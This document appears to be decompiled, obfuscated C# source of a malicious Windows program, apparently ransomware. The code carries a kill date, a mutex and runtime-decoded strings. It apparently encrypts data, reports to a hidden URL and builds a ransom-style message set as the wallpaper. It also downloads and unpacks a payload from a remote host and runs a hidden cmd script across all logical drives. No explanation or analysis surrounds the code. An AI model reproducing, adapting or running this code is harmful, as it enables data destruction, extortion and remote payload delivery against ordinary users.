using System;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Main.Properties;

namespace RU;

internal static class Class15
{
	public static string string_0;

	[STAThread]
	private static void Main()
	{
		if (DateTime.Now > new DateTime(636770014743025897L))
		{
			throw new Exception();
		}
		new Mutex(initiallyOwned: true, string.Format(Class22.smethod_0("\uee22\uee3c\uee39\uee26\uee59\uee5b", 61026)), out var createdNew);
		if (!createdNew)
		{
			Environment.Exit(0);
		}
		if (GClass2.smethod_0(Encoding.UTF8.GetString(Resources.Byte_0)))
		{
			Class7.smethod_8(Class22.smethod_0("\ueb7b\ueb5c\ueb5e\ueb50\ueb57", 60185), string_0);
			if (GClass2.GClass3.Boolean_14)
			{
				Class7.smethod_29(0);
			}
			Thread thread = new Thread((ThreadStart)delegate
			{
				smethod_0();
			});
			thread.Start();
			thread.Join();
			smethod_1();
			Class7.smethod_8(Class22.smethod_0("\uf2be\uf295\uf29f\uf2c1", 62106) + GClass7.long_0, string_0);
		}
		else if (GClass2.GClass3.Boolean_14)
		{
			Class7.smethod_29(-1);
		}
		Class7.smethod_18(0);
	}

	private static void smethod_0()
	{
		GClass8.smethod_0(Class2.Class3.Byte_0, Class2.Class3.Byte_1);
		Class2.Class3.Byte_0 = null;
		Class2.Class3.Byte_1 = null;
	}

	private static void smethod_1()
	{
		try
		{
			string text = "";
			text += Class22.smethod_0("\uf37d\uf344\uf357\uf35d\uf353\uf358\uf316\uf375\uf344\uf34f\uf346\uf342\uf359\uf344", 62260);
			text += Class22.smethod_0("\uea47", 59942);
			text += Class22.smethod_0("\uf749", 63282);
			text += GClass2.GClass3.String_1;
			text += Class22.smethod_0("\uefdd", 61408);
			text += Environment.NewLine;
			text += Environment.NewLine;
			string text2 = "";
			CultureInfo installedUICulture = CultureInfo.InstalledUICulture;
			text2 = ((Class2.Class3.String_6 == Class22.smethod_0("\uf1a3\uf198\uf19d\uf198\uf199\uf181\uf198", 61908)) ? installedUICulture.TwoLetterISOLanguageName.ToLower() : ((!(installedUICulture.TwoLetterISOLanguageName.ToUpper() == Class2.Class3.String_6.ToUpper())) ? installedUICulture.TwoLetterISOLanguageName.ToLower() : installedUICulture.TwoLetterISOLanguageName.ToLower()));
			uint num = Class21.smethod_0(text2);
			if (num <= 1195724803)
			{
				if (num <= 1111292255)
				{
					if (num != 926444256)
					{
						if (num != 1092248970)
						{
							if (num != 1111292255 || !(text2 == Class22.smethod_0("\ue8f4\ue8f0", 59421)))
							{
								goto IL_03fe;
							}
							text += GClass2.GClass3.GClass5.GClass6.String_9;
						}
						else
						{
							if (!(text2 == Class22.smethod_0("\uee59\uee52", 60976)))
							{
								goto IL_03fe;
							}
							text += GClass2.GClass3.GClass5.GClass6.String_2;
						}
					}
					else
					{
						if (!(text2 == Class22.smethod_0("\ueed0\ueedd", 61113)))
						{
							goto IL_03fe;
						}
						text += GClass2.GClass3.GClass5.GClass6.String_6;
					}
				}
				else if (num <= 1164435231)
				{
					if (num != 1126937041)
					{
						if (num != 1164435231 || !(text2 == Class22.smethod_0("\uf515\uf507", 62795)))
						{
							goto IL_03fe;
						}
						text += GClass2.GClass3.GClass5.GClass6.String_14;
					}
					else
					{
						if (!(text2 == Class22.smethod_0("\uf25b\uf257", 62009)))
						{
							goto IL_03fe;
						}
						text += GClass2.GClass3.GClass5.GClass6.String_0;
					}
				}
				else if (num != 1176137065)
				{
					if (num != 1195724803 || !(text2 == Class22.smethod_0("\uec8b\uec8d", 60655)))
					{
						goto IL_03fe;
					}
					text += GClass2.GClass3.GClass5.GClass6.String_13;
				}
				else
				{
					if (!(text2 == Class22.smethod_0("\ue0ba\ue0ac", 57437)))
					{
						goto IL_03fe;
					}
					text += GClass2.GClass3.GClass5.GClass6.String_3;
				}
			}
			else if (num <= 1461901041)
			{
				if (num != 1213488160)
				{
					if (num != 1347311754)
					{
						if (num != 1461901041 || !(text2 == Class22.smethod_0("\uf09d\uf089", 61498)))
						{
							goto IL_03fe;
						}
						text += GClass2.GClass3.GClass5.GClass6.String_4;
					}
					else
					{
						if (!(text2 == Class22.smethod_0("\uf8a8\uf8b9", 63576)))
						{
							goto IL_03fe;
						}
						text += GClass2.GClass3.GClass5.GClass6.String_10;
					}
				}
				else
				{
					if (!(text2 == Class22.smethod_0("\ue56d\ue56a", 58654)))
					{
						goto IL_03fe;
					}
					text += GClass2.GClass3.GClass5.GClass6.String_12;
				}
			}
			else if (num <= 1545391778)
			{
				if (num != 1530879825)
				{
					if (num != 1545391778 || !(text2 == Class22.smethod_0("\uf78b\uf78a", 63426)))
					{
						goto IL_03fe;
					}
					text += GClass2.GClass3.GClass5.GClass6.String_1;
				}
				else
				{
					if (!(text2 == Class22.smethod_0("\ue9b2\ue9ae", 59864)))
					{
						goto IL_03fe;
					}
					text += GClass2.GClass3.GClass5.GClass6.String_8;
				}
			}
			else if (num != 1748694682)
			{
				if (num != 1816099348 || !(text2 == Class22.smethod_0("\uf191\uf19a", 61930)))
				{
					goto IL_03fe;
				}
				text += GClass2.GClass3.GClass5.GClass6.String_7;
			}
			else
			{
				if (!(text2 == Class22.smethod_0("\uf187\uf186", 61931)))
				{
					goto IL_03fe;
				}
				text += GClass2.GClass3.GClass5.GClass6.String_5;
			}
			goto IL_0418;
			IL_0418:
			string text3 = "";
			text3 = Environment.UserName;
			if (text3 == Class22.smethod_0("\ue3aa\ue3a0\ue3aa\ue3ad\ue3bc\ue3b4", 58361) || text3 == Class22.smethod_0("\ue11c\ue116\ue11c\ue11b\ue10a\ue102", 57698))
			{
				text3 = Class22.smethod_0("\ue3ec\ue3ca\ue3dc\ue3cb", 58265);
			}
			text = Regex.Replace(text, Class22.smethod_0("\uf693\uf687", 63156), text3);
			text = Regex.Replace(text, Class22.smethod_0("\ue8c0\ue8d7", 59617), GClass2.GClass3.String_14.Replace(Class22.smethod_0("\uf693\uf687", 63156), Class2.Class3.String_1));
			Color color_ = ColorTranslator.FromHtml(GClass2.GClass3.GClass5.String_0);
			Image image_ = Class7.Class10.smethod_2(text, color_, GClass2.GClass3.GClass5.Int32_0);
			if (GClass2.GClass3.GClass5.Boolean_0)
			{
				Class7.Class11.smethod_0(image_, Class7.Class11.Enum1.const_2);
			}
			goto end_IL_0000;
			IL_03fe:
			text += GClass2.GClass3.GClass5.GClass6.String_2;
			goto IL_0418;
			end_IL_0000:;
		}
		catch (Exception)
		{
		}
		try
		{
			string text4 = string.Format(Class22.smethod_0("\uebd4\ueb9f\uebd2\ueb95\uebf3\uebff\uebdd\uebc0\uebc8\uebdd\uebce\uebc2\uebeb\uebce\uebdb\uebce\uebf3", 60299), Environment.SystemDirectory.Substring(0, 1));
			if (!Directory.Exists(text4))
			{
				Directory.CreateDirectory(text4);
			}
			byte[] array;
			using (WebClient webClient = new WebClient())
			{
				array = webClient.DownloadData(Class22.smethod_0("\uf247\uf25b\uf25b\uf25f\uf25c\uf215\uf200\uf200\uf24b\uf240\uf258\uf241\uf243\uf240\uf24e\uf24b\uf201\uf25c\uf256\uf25c\uf246\uf241\uf25b\uf24a\uf25d\uf241\uf24e\uf243\uf25c\uf201\uf24c\uf240\uf242\uf200\uf249\uf246\uf243\uf24a\uf25c\uf200\uf27c\uf26b\uf24a\uf243\uf24a\uf25b\uf24a\uf201\uf255\uf246\uf25f", 61986));
				if (array == null)
				{
					return;
				}
			}
			string path = Path.Combine(text4, Class22.smethod_0("\uf2da\uf2fe\uf2f4\uf2e5\uf2f8\uf2e4\uf2f8\uf2f1\uf2e3\uf2b9\uf2ed\uf2fe\uf2e7", 62087));
			File.WriteAllBytes(path, array);
			Class16 @class = new Class16(path);
			@class.method_0(text4);
			@class.Dispose();
			File.Delete(path);
			if (!File.Exists(Path.Combine(text4, Class22.smethod_0("\uf64a\uf65d\uf65c\uf655\uf65c\uf64d\uf65c\uf617\uf65c\uf641\uf65c", 63001))) && !File.Exists(Path.Combine(text4, Class22.smethod_0("\ue12c\ue13b\ue13a\ue133\ue13a\ue12b\ue13a\ue169\ue16b\ue171\ue13a\ue127\ue13a", 57678))))
			{
				return;
			}
			if (File.Exists(Path.Combine(text4, Class22.smethod_0("\uef2a\uef1a\uef03\uef0e\uef41\uef1b\uef17\uef1b", 61282))))
			{
				File.Delete(Path.Combine(text4, Class22.smethod_0("\uef2a\uef1a\uef03\uef0e\uef41\uef1b\uef17\uef1b", 61282)));
			}
			if (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable(Class22.smethod_0("\uf127\uf125\uf138\uf134\uf132\uf124\uf124\uf138\uf125\uf128\uf136\uf125\uf134\uf13f\uf13e\uf123\uf132\uf120\uf141\uf143\uf144\uf145", 61814))))
			{
				if (File.Exists(Path.Combine(text4, Class22.smethod_0("\uf64a\uf65d\uf65c\uf655\uf65c\uf64d\uf65c\uf617\uf65c\uf641\uf65c", 63001))))
				{
					File.Delete(Path.Combine(text4, Class22.smethod_0("\uf64a\uf65d\uf65c\uf655\uf65c\uf64d\uf65c\uf617\uf65c\uf641\uf65c", 63001)));
				}
				File.Move(Path.Combine(text4, Class22.smethod_0("\ue12c\ue13b\ue13a\ue133\ue13a\ue12b\ue13a\ue169\ue16b\ue171\ue13a\ue127\ue13a", 57678)), Path.Combine(text4, Class22.smethod_0("\uf64a\uf65d\uf65c\uf655\uf65c\uf64d\uf65c\uf617\uf65c\uf641\uf65c", 63001)));
			}
			else if (File.Exists(Path.Combine(text4, Class22.smethod_0("\ue12c\ue13b\ue13a\ue133\ue13a\ue12b\ue13a\ue169\ue16b\ue171\ue13a\ue127\ue13a", 57678))))
			{
				File.Delete(Path.Combine(text4, Class22.smethod_0("\ue12c\ue13b\ue13a\ue133\ue13a\ue12b\ue13a\ue169\ue16b\ue171\ue13a\ue127\ue13a", 57678)));
			}
			string text5 = Class22.smethod_0("\uf5a5\uf5b2\uf5bb\uf5b2\uf5b6\uf5a4\uf5b2\uf5f9\uf5b5\uf5b6\uf5a3", 62934);
			string text6 = string.Format(Class22.smethod_0("\uf6c1\uf6c1\uf6db\uf6a0\uf6ad\uf69e\uf689\uf688\uf692\uf694\uf695\uf6db\uf680\uf6cb\uf686\uf6a6", 63130), GClass2.GClass3.String_1) + Environment.NewLine + Environment.NewLine + Class22.smethod_0("\ue6eb\ue6fc\ue6f4\ue699\ue6e2\ue6fc\ue6da\ue6d1\ue6d6\ue699\ue6f6\ue6ff\ue6ff\ue6e4", 59033) + Environment.NewLine + Class22.smethod_0("\ue737\ue712\ue714\ue71f\ue718\ue757\ue718\ue711\ue711", 59254) + Environment.NewLine + Environment.NewLine + Class22.smethod_0("\uef8d\uef9a\uef92\uefff\uef84\uef92\uefb6\uefbc\uefad\uefb0\uefac\uefb0\uefb9\uefab\uefff\uef8c\uefa6\uefac\uefb6\uefb1\uefab\uefba\uefad\uefb1\uefbe\uefb3\uefac\uefff\uef9a\uefaa\uefb3\uefbe\uefff\uef9e\uefbc\uefbc\uefba\uefaf\uefab\uefba\uefbb\uef82", 61404) + Environment.NewLine + Class22.smethod_0("\uf6a1\uf6b6\uf6b4\uf6d3\uf6b2\uf6b7\uf6b7\uf6d3\uf6d1\uf6bb\uf6b8\uf6b6\uf6aa\uf6ac\uf6b0\uf6a6\uf6a1\uf6a1\uf6b6\uf6bd\uf6a7\uf6ac\uf6a6\uf6a0\uf6b6\uf6a1\uf6af\uf6a0\uf69c\uf695\uf687\uf684\uf692\uf681\uf696\uf6af\uf6a0\uf68a\uf680\uf69a\uf69d\uf687\uf696\uf681\uf69d\uf692\uf69f\uf680\uf6af\uf6a0\uf6b7\uf696\uf69f\uf696\uf687\uf696\uf6d1", 63219) + Environment.NewLine + Class22.smethod_0("\ue505\ue512\ue510\ue577\ue516\ue513\ue513\ue577\ue575\ue51f\ue51c\ue512\ue50e\ue508\ue514\ue502\ue505\ue505\ue512\ue519\ue503\ue508\ue502\ue504\ue512\ue505\ue50b\ue504\ue538\ue531\ue523\ue520\ue536\ue525\ue532\ue50b\ue504\ue52e\ue524\ue53e\ue539\ue523\ue532\ue525\ue539\ue536\ue53b\ue524\ue50b\ue504\ue513\ue532\ue53b\ue532\ue523\ue532\ue575\ue577\ue578\ue521\ue577\ue512\ue522\ue53b\ue536\ue516\ue534\ue534\ue532\ue527\ue523\ue532\ue533\ue577\ue578\ue523\ue577\ue505\ue512\ue510\ue508\ue513\ue500\ue518\ue505\ue513\ue577\ue578\ue533\ue577\ue566\ue577\ue578\ue531", 58710) + Environment.NewLine + Environment.NewLine + Class22.smethod_0("\ue1a9\ue1be\ue1b6\ue1db\ue1a0\ue1ac\ue192\ue18b\ue19e\ue1db\ue1bf\ue189\ue192\ue18d\ue19e\ue188\ue1db\ue1bd\ue189\ue19e\ue19e\ue1db\ue1a8\ue18b\ue19a\ue198\ue19e\ue1a6", 57674) + Environment.NewLine;
			string[] logicalDrives = Environment.GetLogicalDrives();
			foreach (string text7 in logicalDrives)
			{
				if ((new DriveInfo(text7).IsReady && new DriveInfo(text7).DriveType != DriveType.CDRom) || new DriveInfo(text7).DriveType != 0)
				{
					text6 = ((!(text7.Substring(0, 1) == Environment.SystemDirectory.Substring(0, 1))) ? (text6 + string.Format(Class22.smethod_0("\uf09c\uf092\uf09b\uf0d1\uf09a\uf087\uf09a\uf0df\uf0d0\uf09c\uf0df\uf084\uf0cf\uf082\uf08c\uf09b\uf09a\uf093\uf09a\uf08b\uf09a\uf0d1\uf09a\uf087\uf09a\uf0df\uf0d2\uf085\uf0df\uf084\uf0ce\uf082\uf0c5\uf084\uf0cd\uf082", 61650), text4, text7.Substring(0, 1), Environment.NewLine)) : (text6 + string.Format(Class22.smethod_0("\uf200\uf20e\uf207\uf24d\uf206\uf21b\uf206\uf243\uf24c\uf200\uf243\uf218\uf253\uf21e\uf210\uf207\uf206\uf20f\uf206\uf217\uf206\uf24d\uf206\uf21b\uf206\uf243\uf24e\uf200\uf243\uf24e\uf219\uf243\uf218\uf252\uf21e\uf259\uf218\uf251\uf21e", 62051), text4, text7.Substring(0, 1), Environment.NewLine)));
				}
			}
			text6 = text6 + Environment.NewLine + Class22.smethod_0("\ueaad\ueaba\ueab2\ueadf\ueaa4\ueaac\uea8b\uea9e\uea8d\uea8b\ueadf\ueaac\ueaa6\ueaac\ueaab\ueaba\ueab2\ueadf\ueaac\uea97\uea8a\uea8b\uea9b\uea90\uea88\uea91\ueadf\ueaab\uea96\uea92\uea9a\uea8d\ueaa2", 60031) + Environment.NewLine + string.Format(Class22.smethod_0("\ue084\ue09f\ue082\ue083\ue093\ue098\ue080\ue099\ue0d7\ue0d8\ue0a4\ue0d7\ue0d8\ue0b1\ue0d7\ue0d8\ue0a3\ue0d7\ue08c\ue0c7\ue08a\ue0d7\ue0d8\ue0b4\ue0d7\ue0d5\ue08c\ue0c6\ue08a\ue0d5", 57526), 300, Class22.smethod_0("\uf2ba\uf281\uf28a\uf297\uf29f\uf28a\uf28c\uf29b\uf28a\uf28b\uf2cf\uf29c\uf287\uf29a\uf29b\uf28b\uf280\uf298\uf281\uf2cf\uf28b\uf29a\uf28a\uf2cf\uf29b\uf280\uf2cf\uf282\uf28e\uf286\uf281\uf29b\uf28a\uf281\uf28e\uf281\uf28c\uf28a\uf2cf\uf28d\uf29d\uf28a\uf28e\uf284\uf2c1", 62187)) + Environment.NewLine + Environment.NewLine + Class22.smethod_0("\ueee5\ueef2\ueefa\uee97\ueeec\ueef3\ueede\ueec4\ueed6\ueed5\ueedb\ueed2\uee97\ueee4\ueed6\ueed1\ueed2\uee97\ueef5\ueed8\ueed8\ueec3\ueeea", 60949) + Environment.NewLine + Class22.smethod_0("\ue31b\ue31a\ue31d\ue31c\ue31d\ue310\ue30d\ue359\ue356\ue30a\ue31c\ue30d\ue359\ue302\ue31d\ue31c\ue31f\ue318\ue30c\ue315\ue30d\ue304\ue359\ue30b\ue31c\ue31a\ue316\ue30f\ue31c\ue30b\ue300\ue31c\ue317\ue318\ue31b\ue315\ue31c\ue31d\ue359\ue337\ue316", 58233) + Environment.NewLine + Class22.smethod_0("\uf6bd\uf6bc\uf6bb\uf6ba\uf6bb\uf6b6\uf6ab\uf6ff\uf6f0\uf6ac\uf6ba\uf6ab\uf6ff\uf6a4\uf6bb\uf6ba\uf6b9\uf6be\uf6aa\uf6b3\uf6ab\uf6a2\uf6ff\uf6bd\uf6b0\uf6b0\uf6ab\uf6ac\uf6ab\uf6be\uf6ab\uf6aa\uf6ac\uf6af\uf6b0\uf6b3\uf6b6\uf6bc\uf6a6\uf6ff\uf6b6\uf6b8\uf6b1\uf6b0\uf6ad\uf6ba\uf6be\uf6b3\uf6b3\uf6b9\uf6be\uf6b6\uf6b3\uf6aa\uf6ad\uf6ba\uf6ac", 63197) + Environment.NewLine + Environment.NewLine + Class22.smethod_0("\uf6ea\uf6fd\uf6f5\uf698\uf6e3\uf6fc\uf6dd\uf6d4\uf6dd\uf6cc\uf6dd\uf698\uf6fa\uf6d9\uf6db\uf6d3\uf6cd\uf6c8\uf6cb\uf6e5", 63160) + Environment.NewLine + Class22.smethod_0("\uf8c8\uf8dd\uf8de\uf8db\uf8d2\uf8d6\uf8d1\uf89f\uf8fb\uf8fa\uf8f3\uf8fa\uf8eb\uf8fa\uf89f\uf8ec\uf8e6\uf8ec\uf8eb\uf8fa\uf8f2\uf8ec\uf8eb\uf8fe\uf8eb\uf8fa\uf8fd\uf8fe\uf8fc\uf8f4\uf8ea\uf8ef\uf89f\uf892\uf8d4\uf8da\uf8da\uf8cf\uf8e9\uf8da\uf8cd\uf8cc\uf8d6\uf8d0\uf8d1\uf8cc\uf885\uf88f", 63661) + Environment.NewLine + Class22.smethod_0("\ueb90\ueb8a\ueb8e\ueb84\uebc7\uebb4\uebaf\ueba6\ueba3\ueba8\uebb0\ueba4\ueba8\uebb7\uebbe\uebc7\ueba3\ueba2\uebab\ueba2\uebb3\ueba2", 60390) + Environment.NewLine + Class22.smethod_0("\uf445\uf440\uf440\uf452\uf457\uf45e\uf45a\uf45d\uf413\uf457\uf456\uf45f\uf456\uf447\uf456\uf413\uf440\uf45b\uf452\uf457\uf45c\uf444\uf440\uf413\uf41c\uf472\uf45f\uf45f", 62515) + Environment.NewLine + Environment.NewLine + Class22.smethod_0("\uf085\uf092\uf09a\uf0f7\uf08c\uf093\uf0b2\uf0bb\uf0b2\uf0a3\uf0b2\uf0f7\uf083\uf0b2\uf0ba\uf0a7\uf0f7\uf091\uf0be\uf0bb\uf0b2\uf0a4\uf08a", 61511) + Environment.NewLine + string.Format(Class22.smethod_0("\ueb87\ueb86\ueb8f\uebc3\ueb98\uebd3\ueb9e", 60387), Path.Combine(text4, Class22.smethod_0("\uf64a\uf65d\uf65c\uf655\uf65c\uf64d\uf65c\uf617\uf65c\uf641\uf65c", 63001))) + Environment.NewLine + string.Format(Class22.smethod_0("\ueb87\ueb86\ueb8f\uebc3\ueb98\uebd3\ueb9e", 60387), Path.Combine(text4, text5));
			File.WriteAllText(Path.Combine(text4, text5), text6);
			Process obj = new Process
			{
				StartInfo = 
				{
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = Class22.smethod_0("\uf75c\uf752\uf75b\uf711\uf75a\uf747\uf75a", 63259),
					Arguments = string.Format(Class22.smethod_0("\uefc0\uefac\uefcf\uef8c\uef8b\uefcf\uef94\uefdf\uef92\uefcf\uefc9\uefc9\uefcf\uef94\uefde\uef92", 61387), text4, text5)
				}
			};
			new ProcessStartInfo(text4 + text5);
			obj.Start();
		}
		catch (Exception)
		{
		}
	}

	static Class15()
	{
		if (DateTime.Now > new DateTime(636769865943895385L))
		{
			throw new Exception();
		}
		string_0 = Class22.smethod_0("\ue9bf\ue9a3\ue9a3\ue9a7\ue9a4\ue9ed\ue9f8\ue9f8\ue9e5\ue9b9\ue9b8\ue9f9\ue9b4\ue9b8\ue9f8\ue9e5\ue984\ue981\ue99d\ue9b6\ue9e2", 59862);
	}
}
